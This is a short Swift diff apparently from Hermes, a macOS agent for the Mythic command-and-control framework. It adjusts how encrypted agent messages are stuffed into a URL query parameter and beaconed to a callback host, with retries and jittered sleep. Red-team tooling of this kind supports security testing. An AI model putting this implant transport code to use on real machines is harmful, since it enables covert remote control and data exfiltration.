@@ -23,6 +23,9 @@ func get(data: String) -> String {
     getURLComponents.port = agentConfig.callbackPort
     // Stuffing data into query parameter
     getURLComponents.queryItems = [URLQueryItem(name: agentConfig.queryParameter, value: data)]
+    getURLComponents.percentEncodedQuery = getURLComponents.percentEncodedQuery?.replacingOccurrences(of: "+", with: "%2B")
+    getURLComponents.percentEncodedQuery = getURLComponents.percentEncodedQuery?.replacingOccurrences(of: "/", with: "%2F")
+
     if (agentConfig.useSSL) {
         getURLComponents.scheme = "https"
     }
@@ -125,7 +128,7 @@ func sendHermesMessage(jsonMessage: JSON, payloadUUID: Data, decodedAESKey: Data
     var mythicMessage = "NO_CONNECT"
     if (httpMethod == "get") {
         while mythicMessage == "NO_CONNECT" {
-            mythicMessage = get(data: toBase64URL(base64: hermesMessage))
+            mythicMessage = get(data: hermesMessage)
             if mythicMessage == "NO_CONNECT" {
                 sleepWithJitter()
             }
@@ -139,7 +142,6 @@ func sendHermesMessage(jsonMessage: JSON, payloadUUID: Data, decodedAESKey: Data
             }
         }
     }
-
     // Decode and decrypt Mythic message to JSON string
     let decryptedMythicMessage = decryptMythicMessage(mythicMessage: mythicMessage, key: decodedAESKey, iv: iv)
 
